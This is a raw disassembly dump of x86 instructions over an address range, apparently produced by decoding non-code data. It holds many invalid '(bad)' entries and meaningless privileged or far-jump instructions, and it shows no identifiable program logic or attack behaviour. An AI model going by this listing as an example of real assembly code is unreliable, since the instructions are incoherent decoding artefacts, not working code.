  4236ca:	pop    ebp
  4236cb:	xchg   ebp,ebp
  4236cd:	mov    edx,0xbdfec51a
  4236d2:	dec    edx
  4236d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236d4:	dec    ecx
  4236d5:	cmp    BYTE PTR [eax+0x2d183b0b],bh
  4236db:	adc    BYTE PTR [ebp+0x793bbe1c],cl
  4236e1:	sub    al,BYTE PTR [ecx]
  4236e3:	sub    DWORD PTR [eax-0x6e],0xe4d04f61
  4236ea:	mov    ebp,0x438192fc
  4236ef:	leave  
  4236f0:	scas   eax,DWORD PTR es:[edi]
  4236f1:	xchg   BYTE PTR [edx],ah
  4236f3:	daa    
  4236f4:	pop    ss
  4236f5:	xchg   edi,eax
  4236f6:	inc    ebx
  4236f7:	jl     0x42369d
  4236f9:	aam    0x2f
  4236fb:	je     0x423680
  4236fd:	pop    ss
  4236fe:	cmp    eax,0x9da6d459
  423703:	jb     0x4236d0
  423705:	fistp  WORD PTR [ebp-0x1cbb54ae]
  42370b:	xor    DWORD PTR [ecx],esi
  42370d:	xor    esp,edi
  42370f:	retf   0x951f
  423712:	mov    esi,0x7993e4ce
  423717:	lahf   
  423718:	push   ds
  423719:	out    dx,al
  42371a:	sub    al,0xa7
  42371c:	rcl    WORD PTR [ecx],1
  42371f:	ins    DWORD PTR es:[edi],dx
  423720:	aas    
  423721:	retf   0xd1a1
  423724:	out    dx,eax
  423725:	mov    esp,0xca542f04
  42372a:	pop    edi
  42372b:	in     eax,0x3e
  42372d:	clc    
  42372e:	mov    al,ds:0xcc98bf7f
  423733:	in     eax,0xc8
	...
  423795:	add    BYTE PTR [ebx+eiz*1],dh
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0x5dac25e1
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    cl,dh
  4237af:	cmp    eax,0x803d5d48
  4237b4:	and    edi,edx
  4237b6:	out    0xf5,eax
  4237b8:	and    eax,edi
  4237ba:	mov    eax,ds:0xecebca60
  4237bf:	jmp    0x93c56b04
  4237c4:	jl     0x423803
  4237c6:	lahf   
  4237c7:	inc    esi
  4237c8:	xor    edi,edx
  4237ca:	test   eax,0x476bc2bf
  4237cf:	cs jns 0x4237fb
  4237d2:	sub    bl,BYTE PTR [eax+0x4b24aefe]
  4237d8:	sub    al,0xfd
  4237da:	mov    ah,0x26
  4237dc:	adc    eax,0xe2ace587
  4237e1:	out    dx,eax
  4237e2:	loope  0x423818
  4237e4:	dec    ebx
  4237e5:	adc    ecx,DWORD PTR [ebx]
  4237e7:	sbb    dl,BYTE PTR [ebx+0x65]
  4237ea:	adc    dl,cl
  4237ec:	sti    
  4237ed:	and    ecx,DWORD PTR [edx+esi*1+0x73f8e1cb]
  4237f4:	mov    eax,ds:0x24dd65b
  4237f9:	and    bh,cl
  4237fb:	ins    BYTE PTR es:[edi],dx
  4237fc:	xchg   edi,eax
  4237fd:	ins    BYTE PTR es:[edi],dx
  4237fe:	dec    esp
  4237ff:	add    ebp,DWORD PTR [ecx]
  423801:	xor    BYTE PTR [esi-0x4a],dh
  423804:	inc    edi
  423805:	mov    ah,0xa1
  423807:	mov    ah,0xc
  423809:	jg     0x4237d3
  42380b:	(bad)  
  42380c:	mov    ah,0xd8
  42380e:	mov    ?,ebx
  423810:	(bad)  
  423812:	rol    BYTE PTR [esi],cl
  423814:	call   0xc4cad0f3
  423819:	popa   
  42381a:	mov    ah,0x1e
  42381c:	mov    bh,0x33
  42381e:	and    edi,DWORD PTR [ebp+0x2a53c81f]
  423824:	pop    edi
  423825:	and    BYTE PTR [ecx],dl
  423827:	sub    BYTE PTR [ecx],al
  423829:	push   ebp
  42382a:	or     BYTE PTR [eax],bl
  42382c:	dec    edi
  42382d:	cmc    
  42382e:	scas   eax,DWORD PTR es:[edi]
  42382f:	retf   0x1cfb
  423832:	dec    ebx
  423833:	nop
  423834:	in     al,dx
  423835:	mov    eax,edx
  423837:	es add eax,0x3d8dcfd
  42383d:	sub    DWORD PTR [ecx+0x19e90b14],0xad9a719c
  423847:	pop    esp
  423848:	sti    
  423849:	bound  eax,QWORD PTR [ecx]
  42384b:	sbb    eax,0x865bac11
  423850:	fdivr  DWORD PTR [esi]
  423852:	fcomi  st,st(2)
  423854:	std    
  423855:	outs   dx,BYTE PTR ds:[esi]
  423856:	xchg   DWORD PTR [ebx],esi
  423858:	scas   al,BYTE PTR es:[edi]
  423859:	loopne 0x4238d0
  42385b:	mov    edi,0xf807f8a1
  423860:	arpl   WORD PTR [ecx-0x79bd0d2e],cx
  423866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423867:	mov    ds:0x14f6f17e,eax
  42386c:	fcom   QWORD PTR [edi-0x45bf4ec4]
  423872:	pop    eax
  423873:	js     0x4237fc
  423875:	jns    0x423877
  423877:	mov    edi,0xb507fe0b
  42387c:	jecxz  0x423874
  42387e:	mov    edx,0xefdf8b0
  423883:	rol    BYTE PTR [ecx],cl
  423885:	dec    ebp
  423886:	pop    ecx
  423887:	xchg   dh,cl
  423889:	(bad)  
  42388a:	shl    DWORD PTR [esi],1
  42388c:	push   cs
  42388d:	add    cl,al
  42388f:	retf   0x1d4
  423892:	and    DWORD PTR [ecx],ecx
  423894:	test   al,0x69
  423896:	pop    ds
  423897:	mov    al,ds:0xa425c773
  42389c:	retf   0xe051
  42389f:	fcmovnbe st,st(6)
  4238a1:	push   edx
  4238a2:	sub    esi,DWORD PTR [ebx]
  4238a4:	pop    eax
  4238a5:	pop    eax
  4238a6:	mov    bl,0x2f
  4238a8:	inc    ebp
  4238a9:	dec    ebx
  4238aa:	jo     0x4238d0
  4238ac:	lods   eax,DWORD PTR ds:[esi]
  4238ad:	inc    edi
  4238ae:	push   esi
  4238af:	or     al,BYTE PTR [ecx]
  4238b1:	push   edi
  4238b2:	jl     0x42386d
  4238b4:	js     0x4238b6
	...
  423916:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    DWORD PTR [edx+0x7e1ca23a],edx
  423927:	jp     0x42392a
  423929:	add    BYTE PTR [edi],al
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    bl,dh
  42392f:	int3   
  423930:	push   ecx
  423931:	push   edi
  423932:	jecxz  0x423969
  423934:	and    eax,0xe78279d2
  423939:	mov    DWORD PTR ds:0x54ea19e3,esp
  42393f:	xor    esp,DWORD PTR [edx+0x4e819d52]
  423945:	adc    eax,0x9dcf6726
  42394a:	dec    esi
  42394b:	or     BYTE PTR [ebx],ah
  42394d:	clc    
  42394e:	mov    WORD PTR [edi+0x72],fs
  423951:	rcr    BYTE PTR [ebp+0xeb01de6],cl
  423957:	jnp    0x42397b
  423959:	xchg   esi,eax
  42395a:	jge    0x423963
  42395c:	pop    es
  42395d:	jns    0x423961
  42395f:	push   0x3081a978
  423964:	mov    ss,WORD PTR [esi+0x5]
  423967:	repnz xor al,0x3d
  42396a:	pop    esp
  42396b:	mov    eax,0xa8a78dec
  423970:	sbb    eax,0x8c97b1b2
  423975:	out    dx,eax
  423976:	dec    ebp
  423977:	push   0xffffffcf
  423979:	not    bh
  42397b:	push   ecx
  42397c:	or     ch,BYTE PTR [ebp+0x44]
  42397f:	dec    esp
  423980:	arpl   WORD PTR [ebx],bp
  423982:	sub    al,BYTE PTR [edi+0x47]
  423985:	seta   BYTE PTR [esi-0x4f]
  423989:	(bad)  
  42398a:	jg     0x423a0a
  42398c:	inc    ebx
  42398d:	daa    
  42398e:	aas    
  42398f:	xchg   ebx,eax
  423990:	xchg   BYTE PTR [edx],dl
  423992:	push   es
  423993:	dec    cx
  423995:	fwait
  423996:	ret    
  423997:	sub    DWORD PTR [esi+0x58],0xffffffd1
  42399b:	in     eax,dx
  42399c:	lea    ebp,ds:0xcea729a9
  4239a2:	mov    bl,0xa2
  4239a4:	adc    edi,DWORD PTR [edi]
  4239a6:	sbb    BYTE PTR ds:0xfefc158b,0xa1
  4239ad:	daa    
  4239ae:	jge    0x423957
  4239b0:	cdq    
  4239b1:	stos   DWORD PTR es:[edi],eax
  4239b2:	loopne 0x4239f8
  4239b4:	ins    BYTE PTR es:[edi],dx
  4239b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239b6:	xchg   DWORD PTR [ebp+0x5b],esp
  4239b9:	adc    al,0xc7
  4239bb:	out    dx,al
  4239bc:	xor    eax,0x7ed5bb62
  4239c1:	loop   0x423976
  4239c3:	ror    DWORD PTR fs:[esi-0x4],cl
  4239c7:	sub    DWORD PTR [esi+0x7a],edi
  4239ca:	jae    0x423a43
  4239cc:	sbb    DWORD PTR [ebx+0x7ddb9321],ecx
  4239d2:	jnp    0x423997
  4239d4:	jp     0x423a51
  4239d6:	jae    0x4239ed
  4239d8:	rol    BYTE PTR ds:0x35193bf7,cl
  4239de:	mov    cl,0x3f
  4239e0:	cmc    
  4239e1:	scas   eax,DWORD PTR es:[edi]
  4239e2:	xchg   esi,eax
  4239e3:	sahf   
  4239e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239e5:	outs   dx,DWORD PTR cs:[esi]
  4239e7:	pop    es
  4239e8:	dec    edx
  4239e9:	inc    ebx
  4239ea:	enter  0xbda4,0xf0
  4239ee:	jnp    0x42398d
  4239f0:	adc    eax,0xef1c8804
  4239f5:	cvtps2pd xmm7,xmm1
  4239f8:	stos   BYTE PTR es:[edi],al
  4239f9:	gs es aas 
  4239fc:	mov    DWORD PTR [ebx+0x3b45af8b],0x2719cc96
  423a06:	mov    ds:0x21862223,eax
  423a0b:	or     eax,0x1ced3f73
  423a10:	repz mov esi,0xe91ee5e1
  423a16:	test   BYTE PTR [edi],dh
  423a18:	jmp    FWORD PTR [ebx+0x61]
  423a1b:	fucomi st,st(3)
  423a1d:	fisttp WORD PTR [ebp+0x5e532823]
  423a23:	ror    BYTE PTR [eax+0x3fd4be4a],0xfd
  423a2a:	sti    
  423a2b:	fmul   DWORD PTR [edi]
  423a2d:	mov    ?,WORD PTR [ebp-0x72199597]
  423a33:	fidiv  WORD PTR [ecx+0x0]
	...
  423a96:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	sti    
  423aa3:	dec    edx
  423aa4:	xor    eax,0x17b859d
  423aa9:	add    BYTE PTR [edi],al
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    BYTE PTR [ecx-0x5e],ah
  423ab0:	jmp    0x934b:0xaa56eb5b
  423ab7:	sti    
  423ab8:	js     0x423ac2
  423aba:	aam    0xa9
  423abc:	sahf   
  423abd:	push   ss
  423abe:	pushf  
  423abf:	jmp    0x3c8e602b
  423ac4:	mov    dl,BYTE PTR [eax]
  423ac6:	adc    esi,DWORD PTR [esi]
  423ac8:	dec    ebp
  423ac9:	mov    cl,0xff
  423acb:	add    edx,ebp
  423acd:	sbb    eax,DWORD PTR [ecx]
  423acf:	scas   eax,DWORD PTR es:[edi]
  423ad0:	mov    ecx,0x52d53466
  423ad5:	dec    ecx
  423ad6:	lea    ebx,[edi+0x48]
  423ad9:	fadd   QWORD PTR [edx+0x1aee4683]
  423adf:	inc    esp
  423ae0:	out    0x2f,al
  423ae2:	inc    ebp
  423ae3:	add    eax,0x71d122d0
  423ae8:	adc    ecx,DWORD PTR [ebp+0x43]
  423aeb:	or     DWORD PTR [esi+0x60],ebp
  423aee:	adc    ebx,DWORD PTR [esi-0x44]
  423af1:	ja     0x423acc
  423af3:	mov    ch,0x3e
  423af5:	inc    edx
  423af6:	push   cs
  423af7:	inc    ecx
  423af8:	xor    eax,0x1822837d
  423afd:	mov    ds:0xcdfff4b1,eax
  423b02:	push   0xffffffcf
  423b04:	mov    ebx,0x60c47b58
  423b09:	pop    esp
  423b0a:	cmp    eax,0xf59c8f07
  423b0f:	sbb    ch,BYTE PTR [ebp-0x13a2dea3]
  423b15:	outs   dx,DWORD PTR ds:[esi]
  423b16:	das    
  423b17:	xor    BYTE PTR [esi-0x26],dl
  423b1a:	ret    
  423b1b:	jmp    0x7b3f887c
  423b20:	ror    DWORD PTR [ebx+0x672810a5],0x6f
  423b27:	or     bh,BYTE PTR [eax-0x5b]
  423b2a:	data16 sub al,0xff
  423b2d:	jle    0x423b96
  423b2f:	mov    WORD PTR [ecx-0x27],ds
  423b32:	mov    dh,0x87
  423b34:	retf   0x5e76
  423b37:	(bad)  
  423b38:	mov    edi,0xe854fc23
  423b3d:	bound  esp,QWORD PTR [edi]
  423b3f:	mov    ds:0x504d10d7,al
  423b44:	push   esp
  423b45:	ja     0x423b96
  423b47:	push   0x67
  423b49:	or     al,0x9f
  423b4b:	sti    
  423b4c:	fistp  WORD PTR [esi-0x339a85b6]
  423b52:	xor    eax,0xbb3ccabf
  423b57:	arpl   WORD PTR [ebp-0x2d31cd02],bx
  423b5d:	xchg   esp,eax
  423b5e:	scas   al,BYTE PTR es:[edi]
  423b5f:	sub    BYTE PTR [ecx],ch
  423b61:	inc    ebp
  423b62:	jbe    0x423b4d
  423b64:	test   BYTE PTR [eax+0x1d3a0417],bh
  423b6a:	es or  eax,0xe978bdaa
  423b70:	mov    al,0xf4
  423b72:	mov    WORD PTR ds:0x9ed9e828,?
  423b78:	mov    ds:0xf743246c,al
  423b7d:	retf   0xe964
  423b80:	nop
  423b81:	mov    edi,DWORD PTR [edi+0x6c]
  423b84:	pop    edi
  423b85:	add    DWORD PTR [esi+edi*1],ebx
  423b88:	inc    edi
  423b89:	lahf   
  423b8a:	push   eax
  423b8b:	mov    DWORD PTR [ebp-0x3e173296],eax
  423b91:	xchg   ebp,eax
  423b92:	jmp    0x492f:0xe61dad6
  423b99:	xor    al,0xd5
  423b9b:	pop    es
  423b9c:	cmp    al,0x2a
  423b9e:	adc    edx,DWORD PTR [esi+esi*8+0x57]
  423ba2:	adc    BYTE PTR [esi+0xbd82701],al
  423ba8:	ret    
  423ba9:	sub    eax,DWORD PTR [edx-0x732a703a]
  423baf:	test   al,0x53
  423bb1:	mov    eax,0x6c679b
	...
  423c16:	std    
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	arpl   si,cx
  423c24:	(bad)  
  423c25:	dec    BYTE PTR [esp+edi*2+0x1070001]
  423c2c:	add    BYTE PTR [eax],al
  423c2e:	aad    0x4
  423c30:	hlt    
  423c31:	popa   
  423c32:	mov    ds,eax
  423c34:	inc    eax
  423c35:	clc    
  423c36:	jg     0x423c53
  423c38:	xor    eax,0x229491
  423c3d:	loopne 0x423c66
  423c3f:	call   0xed39:0xf2c9d5e3
  423c46:	lea    esi,[edx]
  423c48:	add    eax,DWORD PTR [edi-0x4e660148]
  423c4e:	cwde   
  423c4f:	push   es
  423c50:	push   ds
  423c51:	push   ecx
  423c52:	lea    ebx,[eax]
  423c54:	add    al,0x7d
  423c56:	mov    edi,0x837d7807
  423c5b:	out    0xb1,eax
  423c5d:	dec    edx
  423c5e:	je     0x423cae
  423c60:	push   edx
  423c61:	mov    esi,0xb84facb4
  423c66:	test   eax,0x3c857edf
  423c6b:	icebp  
  423c6c:	mov    eax,gs
  423c6e:	sahf   
  423c6f:	mov    ebp,0xd6fb1164
  423c74:	sub    dl,ch
  423c76:	sbb    dl,dl
  423c78:	pop    ecx
  423c79:	jns    0x423cd8
  423c7b:	jns    0x423c5b
  423c7d:	xor    eax,0x4cb1874c
  423c82:	dec    ebx
  423c83:	xchg   esp,eax
  423c84:	jmp    0x2777b767
  423c89:	sub    al,0xfb
  423c8b:	dec    edi
  423c8c:	mul    DWORD PTR [esi+ecx*2+0x49]
  423c90:	mov    ah,0x4e
  423c92:	scas   eax,DWORD PTR es:[edi]
  423c93:	in     al,dx
  423c94:	add    al,0xb3
  423c96:	mov    eax,ds:0x319610e9
  423c9b:	sub    ebx,ecx
  423c9d:	jae    0x423cb5
  423c9f:	loop   0x423c8c
  423ca1:	loope  0x423cda
  423ca3:	or     edx,eax
  423ca5:	ret    0xed27
  423ca8:	fwait
  423ca9:	stc    
  423caa:	clc    
  423cab:	mov    edx,0xa4a8186f
  423cb0:	and    BYTE PTR [ebp-0x37],ah
  423cb3:	adc    ah,BYTE PTR [esi-0x529a5db7]
  423cb9:	ins    DWORD PTR es:[edi],dx
  423cba:	icebp  
  423cbb:	xlat   BYTE PTR es:[ebx]
  423cbd:	ret    0x6281
  423cc0:	loopne 0x423d30
  423cc2:	in     al,0x43
  423cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cc5:	xchg   cl,bl
  423cc7:	pop    edi
  423cc8:	ins    DWORD PTR es:[edi],dx
  423cc9:	cmp    cl,BYTE PTR [edx]
  423ccb:	jge    0x423d1e
  423ccd:	push   ebp
  423cce:	cmp    eax,0xd4b73569
  423cd3:	(bad)  
  423cd4:	dec    esp
  423cd5:	add    BYTE PTR [edx],dh
  423cd7:	les    edx,FWORD PTR [esi+0x76]
  423cda:	inc    eax
  423cdb:	dec    DWORD PTR [edi+ebp*4-0x41]
  423cdf:	push   ds
  423ce0:	(bad)  
  423ce1:	jae    0x423ca4
  423ce3:	enter  0xbcb6,0x7a
  423ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ce8:	push   eax
  423ce9:	cdq    
  423cea:	cmp    eax,0x80e42cf4
  423cef:	dec    ebx
  423cf0:	xchg   edi,eax
  423cf1:	dec    esp
  423cf2:	cmp    eax,0x6648d1b6
  423cf7:	xchg   ebx,edi
  423cf9:	loop   0x423ccf
  423cfb:	pop    ebp
  423cfc:	mov    esi,DWORD PTR [esi+0x6d]
  423cff:	sbb    DWORD PTR [edx+0x3157c5df],edi
  423d05:	sti    
  423d06:	inc    edi
  423d07:	mov    ch,0xd7
  423d09:	xchg   edi,eax
  423d0a:	mov    dl,0xeb
  423d0c:	retf   0xdaa3
  423d0f:	sub    eax,DWORD PTR [esi]
  423d11:	mov    ebp,0x9fb0b66d
  423d16:	pop    ebx
  423d17:	xchg   esi,eax
  423d18:	mov    bh,0x18
  423d1a:	dec    eax
  423d1b:	xchg   edx,eax
  423d1c:	hlt    
  423d1d:	rol    DWORD PTR [edx-0x65],0xe
  423d21:	sar    DWORD PTR ds:0xb0860f38,0x6a
  423d28:	dec    edi
  423d29:	xchg   ebp,eax
  423d2a:	jl     0x423ce7
  423d2c:	jb     0x423d2c
  423d2e:	sbb    eax,0x11656dde
  423d33:	xchg   ecx,eax
  423d34:	clc    
	...
  423d95:	add    BYTE PTR [edx-0xa],ah
  423d98:	xchg   DWORD PTR [ecx],ecx
  423d9a:	xchg   edi,eax
  423d9b:	jns    0x423d8b
  423d9d:	dec    edi
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	arpl   cx,bx
  423da4:	inc    ebx
  423da5:	adc    edx,DWORD PTR [ebx+0x700017d]
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    ch,dl
  423daf:	xchg   ecx,eax
  423db0:	push   0xffffffec
  423db2:	mov    ch,0x30
  423db4:	(bad)  
  423db6:	loop   0x423df1
  423db8:	and    dh,dh
  423dba:	push   ds
  423dbb:	call   0xab24ff6d
  423dc0:	or     esp,DWORD PTR [ebx]
  423dc2:	ss cdq 
  423dc4:	retf   0xccec
  423dc7:	loopne 0x423dce
  423dc9:	sub    ecx,ebx
  423dcb:	add    bh,al
  423dcd:	push   es
  423dce:	leave  
  423dcf:	iret   
  423dd0:	in     al,dx
  423dd1:	adc    edx,DWORD PTR [eax+0x76]
  423dd4:	int    0xb7
  423dd6:	xlat   BYTE PTR ds:[ebx]
  423dd7:	cmp    DWORD PTR [edi],edx
  423dd9:	arpl   bx,bx
  423ddb:	ret    0x1eae
  423dde:	out    0x53,eax
  423de0:	stos   BYTE PTR es:[edi],al
  423de1:	sbb    al,0xcd
  423de3:	stos   DWORD PTR es:[edi],eax
  423de4:	imul   esi,DWORD PTR [edi-0x24fc434],0x8485adb4
  423dee:	dec    esi
  423def:	or     bl,BYTE PTR [ecx+0x10]
  423df2:	rcl    DWORD PTR [ebx+0x34bf50a],1
  423df8:	cdq    
  423df9:	ins    DWORD PTR es:[edi],dx
  423dfa:	sahf   
  423dfb:	bound  ecx,QWORD PTR [ecx+0x36]
  423dfe:	jo     0x423e66
  423e00:	and    al,0x9e
  423e02:	inc    esp
  423e03:	jle    0x423e0e
  423e05:	pop    eax
  423e06:	ret    
  423e07:	dec    ebp
  423e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e09:	mov    BYTE PTR [edx],0x9
  423e0c:	mov    esi,0x8ada0971
  423e11:	div    bh
  423e13:	push   esp
  423e14:	inc    esp
  423e15:	stos   DWORD PTR es:[edi],eax
  423e16:	mov    DWORD PTR [edi],edi
  423e18:	add    esp,DWORD PTR [edi-0x5d]
  423e1b:	inc    ebp
  423e1c:	cmp    ah,BYTE PTR [ecx+0x5c2b4bf6]
  423e22:	pop    ss
  423e23:	enter  0xe466,0xe4
  423e27:	or     eax,0x119b35e9
  423e2c:	pop    ebx
  423e2d:	add    dl,BYTE PTR [edi-0x55207da]
  423e33:	jbe    0x423e8c
  423e35:	sub    bh,BYTE PTR [eax+0x37bf8aa0]
  423e3b:	adc    esi,DWORD PTR [eax]
  423e3d:	push   ecx
  423e3e:	sub    BYTE PTR [edx],0x1d
  423e41:	loope  0x423e96
  423e43:	jg     0x423de4
  423e45:	jp     0x423e18
  423e47:	cmp    DWORD PTR ds:0xe83e76b7,edx
  423e4d:	outs   dx,DWORD PTR ds:[esi]
  423e4e:	inc    eax
  423e4f:	into   
  423e50:	jb     0x423e55
  423e52:	in     al,dx
  423e53:	call   0x5b40c251
  423e58:	out    0x12,eax
  423e5a:	cli    
  423e5b:	add    DWORD PTR [edi-0x765777c7],edi
  423e61:	js     0x423e44
  423e63:	inc    eax
  423e64:	inc    ecx
  423e65:	js     0x423dfd
  423e67:	frstor [edx-0x2e090938]
  423e6d:	jge    0x423eab
  423e6f:	or     esp,ecx
  423e71:	outs   dx,BYTE PTR ds:[esi]
  423e72:	xor    ebp,DWORD PTR [edi]
  423e74:	out    dx,al
  423e75:	(bad)  
  423e76:	push   ss
  423e77:	push   esi
  423e78:	lahf   
  423e79:	mov    edi,0xad1f050d
  423e7e:	mov    ch,0x62
  423e80:	lock mov ebx,ss
  423e83:	rcr    edi,0x94
  423e86:	fisub  DWORD PTR ds:0x40b20054
  423e8c:	je     0x423e2f
  423e8e:	jns    0x423ec8
  423e90:	jb     0x423ea5
  423e92:	out    dx,eax
  423e93:	jbe    0x423ef5
  423e95:	lea    ebp,[esp+eax*4-0x39b3a117]
  423e9c:	je     0x423ef2
  423e9e:	in     eax,0xe1
  423ea0:	fs push cs
  423ea2:	loopne 0x423e65
  423ea4:	cwde   
  423ea5:	lods   al,BYTE PTR ds:[esi]
  423ea6:	push   0xb4fa43ec
  423eab:	aaa    
  423eac:	ret    
  423ead:	mov    ds:0xe1fdc413,al
  423eb2:	pusha  
  423eb3:	call   0x423ed2
	...
  423f14:	add    BYTE PTR [eax],al
  423f16:	scas   al,BYTE PTR es:[edi]
  423f17:	call   0x9fff:0xff74b964
  423f1e:	xor    ebp,esi
  423f20:	xchg   BYTE PTR [eax+0x1c],dl
  423f23:	rcr    edx,1
  423f25:	rcr    DWORD PTR [edx+0x700017e],0x1
  423f2c:	add    BYTE PTR [eax],al
  423f2e:	enter  0x2e34,0x13
  423f32:	in     al,0x5d
  423f34:	xchg   ebp,eax
  423f35:	or     BYTE PTR [ebx-0x1a],dl
  423f38:	xchg   ebx,eax
  423f39:	fmul   DWORD PTR [edi]
  423f3b:	int    0x0
  423f3d:	sbb    cl,BYTE PTR [edx]
  423f3f:	mov    ebx,0x93446898
  423f44:	ins    DWORD PTR es:[edi],dx
  423f45:	cmp    eax,0x27d7fb4a
  423f4a:	inc    edx
  423f4b:	pop    es
  423f4c:	popa   
  423f4d:	mov    dl,0xa6
  423f4f:	std    
  423f50:	or     al,ch
  423f52:	fwait
  423f53:	(bad)  
  423f54:	push   0x86b91793
  423f59:	or     al,0xa1
  423f5b:	dec    eax
  423f5c:	xchg   ebx,eax
  423f5d:	jle    0x423f9d
  423f5f:	jecxz  0x423f8e
  423f61:	inc    ebx
  423f62:	mov    ebp,eax
  423f64:	inc    ebx
  423f65:	xchg   edi,eax
  423f66:	sub    BYTE PTR [eax+ebx*1-0x2304f931],0x76
  423f6e:	ret    0x794
  423f71:	adc    eax,DWORD PTR [edx]
  423f73:	mov    ah,0xe0
  423f75:	jae    0x423fb0
  423f77:	test   eax,0xa05f490a
  423f7c:	adc    ecx,ecx
  423f7e:	imul   ebp,DWORD PTR [ebx+0x44],0x45
  423f82:	sbb    DWORD PTR [ebx-0x51],0x82710eac
  423f89:	int3   
  423f8a:	outs   dx,DWORD PTR ds:[esi]
  423f8b:	sub    DWORD PTR [edi+eax*4+0x44bcbce6],esp
  423f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f93:	push   ds
  423f94:	mov    ecx,0x65338650
  423f99:	add    ecx,ecx
  423f9b:	jb     0x423fdb
  423f9d:	in     eax,dx
  423f9e:	jecxz  0x423fb3
  423fa0:	stos   DWORD PTR es:[edi],eax
  423fa1:	pop    ebx
  423fa2:	dec    esp
  423fa3:	jnp    0x423f2d
  423fa5:	xor    ebp,DWORD PTR [ebx+0x4d]
  423fa8:	mov    ebx,0x9a4bec0
  423fad:	mov    ah,0xb9
  423faf:	mov    al,0xfd
  423fb1:	(bad)  
  423fb2:	mov    bh,0xbb
  423fb4:	pop    esp
  423fb5:	fwait
  423fb6:	aaa    
  423fb7:	popa   
  423fb8:	add    al,0x2a
  423fba:	(bad)  
  423fbb:	xchg   ecx,eax
  423fbc:	cwde   
  423fbd:	jno    0x423f96
  423fbf:	cmp    al,0xb9
  423fc1:	xchg   esp,eax
  423fc2:	loop   0x42402a
  423fc4:	xchg   DWORD PTR [ebx+0x77030b1a],esp
  423fca:	out    dx,eax
  423fcb:	add    DWORD PTR [ecx],ebp
  423fcd:	sbb    ebx,edi
  423fcf:	outs   dx,DWORD PTR ds:[esi]
  423fd0:	and    DWORD PTR [ebp-0x58e92606],0x29
  423fd7:	fsub   QWORD PTR [ecx+0x2]
  423fda:	scas   al,BYTE PTR es:[edi]
  423fdb:	aam    0xd9
  423fdd:	cwde   
  423fde:	int    0x5f
  423fe0:	or     cl,BYTE PTR [esi+ecx*8]
  423fe3:	xchg   DWORD PTR [edx+0x6d6d87bc],ebx
  423fe9:	sub    BYTE PTR [ecx-0x39],ch
  423fec:	mov    ebp,0x4b1fedc5
  423ff1:	repnz or BYTE PTR [esi+0x3bc78df9],0xaf
  423ff9:	xchg   BYTE PTR [ebp-0x5],bh
  423ffc:	sub    eax,0xe10d1cda
  424001:	out    dx,eax
  424002:	push   eax
  424003:	lahf   
  424004:	loope  0x424048
  424006:	sbb    eax,0xd5493c5e
  42400b:	test   al,0xe6
  42400d:	push   0x9f23c9e0
  424012:	and    BYTE PTR [eax],cl
  424014:	repnz or ecx,ecx
  424017:	lahf   
  424018:	push   ebp
  424019:	lds    ebp,FWORD PTR [ebp+0x4056d327]
  42401f:	push   edi
  424020:	lahf   
  424021:	adc    al,BYTE PTR [ebx]
  424023:	popf   
  424024:	sub    BYTE PTR ds:0xc36663ea,0x7f
  42402b:	retf   0x4fa1
  42402e:	jbe    0x423ff2
  424030:	sbb    al,0xaa
  424032:	fistp  QWORD PTR [eax-0x7]
	...
  424095:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424099:	mov    cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi+0x19aa1cf1]
  4240a3:	jne    0x424068
  4240a5:	enter  0x7fa1,0x1
  4240a9:	add    BYTE PTR [edi],al
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    cl,cl
  4240af:	fisubr WORD PTR [eax-0x73e13d2c]
  4240b5:	mov    WORD PTR [edx+0x4b],gs
  4240b8:	bound  ebp,QWORD PTR ds:0x364e420a
  4240be:	cli    
  4240bf:	mov    bh,0xdd
  4240c1:	mov    ds:0xddd36ed7,al
  4240c6:	add    al,0xeb
  4240c9:	pop    ecx
  4240ca:	push   edx
  4240cb:	pop    eax
  4240cc:	sub    DWORD PTR [edi-0x5bed4f9f],0xffffffe7
  4240d3:	inc    edx
  4240d4:	adc    eax,0x48b469f8
  4240d9:	scas   al,BYTE PTR es:[edi]
  4240da:	mov    ah,0x39
  4240dc:	jb     0x4240f6
  4240de:	dec    ebx
  4240df:	or     edx,eax
  4240e1:	add    al,0xda
  4240e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240e4:	pusha  
  4240e5:	jo     0x42411f
  4240e7:	adc    bh,BYTE PTR [ebx]
  4240e9:	pop    edi
  4240ea:	scas   al,BYTE PTR es:[edi]
  4240eb:	cli    
  4240ec:	sbb    eax,0xa5c2195a
  4240f1:	dec    esi
  4240f2:	cmp    edi,0xffffffc7
  4240f5:	cmp    esp,DWORD PTR cs:[ecx]
  4240f8:	pop    esi
  4240f9:	xor    al,0x68
  4240fb:	pop    es
  4240fc:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4240fe:	adc    esi,DWORD PTR [ebx+eax*8]
  424101:	push   eax
